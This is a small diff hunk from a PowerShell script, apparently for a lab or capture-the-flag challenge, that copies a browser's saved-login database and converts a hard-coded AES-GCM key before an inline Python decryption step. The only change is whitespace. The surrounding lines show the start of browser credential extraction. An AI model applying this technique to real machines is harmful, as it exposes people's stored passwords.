@@ -131,7 +131,7 @@ Copy-Item -Path $loginDataPath -Destination $copyPath -Force
 
 # 2. Define the AES-GCM Final Secret Key (from Challenge 5)
 $hexKey = "3bd3bef8ad848d75d91ce86d07de766ad52877827e0942918df20456853c81ac"
-$keyBytes = [byte[]](-split ($hexKey -replace '..', '0x$& '))
+$keyBytes = [byte[]] (-split ($hexKey -replace '..', '0x$& ')) 
 
 # 3. Inline Python script execution (or system SQLite inspection)
 python -c "
